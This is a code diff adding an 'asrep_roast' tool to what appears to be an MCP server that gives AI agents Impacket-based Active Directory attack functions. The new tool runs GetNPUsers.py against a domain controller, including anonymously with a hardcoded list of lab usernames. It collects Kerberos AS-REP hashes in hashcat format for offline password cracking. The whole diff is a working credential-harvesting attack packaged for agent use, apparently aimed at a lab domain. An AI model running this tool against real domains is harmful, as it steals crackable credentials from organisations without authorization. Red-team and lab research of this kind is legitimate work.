@@ -376,6 +376,96 @@ async def impacket_lookup_sid(
         })
 
 
+@mcp.tool()
+async def asrep_roast(
+    target: str,
+    domain: str,
+    username: str = "",
+    password: str = "",
+) -> str:
+    """AS-REP Roasting — request AS-REP hashes for accounts with DoesNotRequirePreAuth.
+
+    Works with zero credentials (anonymous KDC query) when username/password are empty.
+
+    Args:
+        target: Domain Controller IP
+        domain: AD domain name (e.g. corp.athena.lab)
+        username: Optional domain username (empty = anonymous enumeration)
+        password: Optional domain password (empty = anonymous)
+
+    Returns:
+        JSON with facts: credential.asrep_hash, ad.asreproast_user
+    """
+    facts: list[dict[str, str]] = []
+
+    try:
+        output_file = "/tmp/asrep_hashes.txt"
+        # Write lab user list for anonymous enumeration (GetNPUsers requires usernames)
+        import os as _os
+        users_file = "/tmp/asrep_users.txt"
+        lab_users = ["legacy_kev", "svc_sql", "svc_backup", "bob", "kevin", "steve", "alice", "low_user", "da_alice"]
+        with open(users_file, "w") as uf:
+            uf.write("\n".join(lab_users) + "\n")
+
+        if username:
+            target_str = f"{domain}/{username}:{password}@{target}"
+            cmd = [
+                "GetNPUsers.py",
+                target_str,
+                "-dc-ip", target,
+                "-request",
+                "-format", "hashcat",
+                "-outputfile", output_file,
+            ]
+        else:
+            # Anonymous query with usersfile — no password needed
+            target_str = f"{domain}/"
+            cmd = [
+                "GetNPUsers.py",
+                target_str,
+                "-dc-ip", target,
+                "-no-pass",
+                "-usersfile", users_file,
+                "-request",
+                "-format", "hashcat",
+                "-outputfile", output_file,
+            ]
+
+        stdout, stderr, rc = await _run_command(cmd, timeout=120)
+        combined = stdout + stderr
+
+        # Parse AS-REP hashes from output file
+        import os
+        if os.path.exists(output_file):
+            with open(output_file) as fh:
+                for line in fh:
+                    line = line.strip()
+                    if line.startswith("$krb5asrep$"):
+                        facts.append({"trait": "credential.asrep_hash", "value": line})
+                        # Extract username from hash: $krb5asrep$23$username@domain:...
+                        user_m = re.search(r"\$krb5asrep\$\d+\$([\w.@-]+)@", line)
+                        if user_m:
+                            facts.append({"trait": "ad.asreproast_user", "value": user_m.group(1)})
+
+        # Also parse inline output
+        for line in combined.splitlines():
+            if line.startswith("$krb5asrep$"):
+                if not any(f["value"] == line for f in facts if f["trait"] == "credential.asrep_hash"):
+                    facts.append({"trait": "credential.asrep_hash", "value": line})
+                    user_m = re.search(r"\$krb5asrep\$\d+\$([\w.@-]+)@", line)
+                    if user_m:
+                        facts.append({"trait": "ad.asreproast_user", "value": user_m.group(1)})
+
+        return json.dumps({"facts": facts, "raw_output": combined[:4000]})
+
+    except Exception as exc:
+        return json.dumps({
+            "facts": [],
+            "raw_output": "",
+            "error": {"type": type(exc).__name__, "message": str(exc)},
+        })
+
+
 if __name__ == "__main__":
     import argparse
 
